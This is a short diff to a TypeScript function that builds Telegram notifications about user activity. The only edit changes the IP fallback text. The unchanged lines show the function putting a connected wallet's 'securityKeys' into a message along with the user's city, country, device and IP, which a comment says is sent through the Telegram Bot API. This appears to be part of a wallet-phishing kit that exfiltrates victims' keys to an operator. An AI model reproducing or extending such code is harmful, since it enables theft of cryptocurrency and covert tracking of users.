@@ -65,7 +65,7 @@ export async function sendTelegramNotification(activity: UserActivity) {
         `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
         `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
         `📱 Device: ${activity.userAgent}\n` +
-        `🔗 IP: ${activity.location?.ip || "Hidden"}`
+        `🔗 IP: ${activity.location?.ip || ""}`
     } else if (activity.type === "wallet_connect") {
       message =
         `💰 <b>Wallet Connected</b>\n\n` +
@@ -75,7 +75,7 @@ export async function sendTelegramNotification(activity: UserActivity) {
         `📝 Keys: ${activity.securityKeys ? activity.securityKeys : "Not provided"}\n` +
         `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
         `📱 Device: ${activity.userAgent}\n` +
-        `🔗 IP: ${activity.location?.ip || "Hidden"}`
+        `🔗 IP: ${activity.location?.ip || ""}`
     }
 
     // Send message to Telegram using Bot API
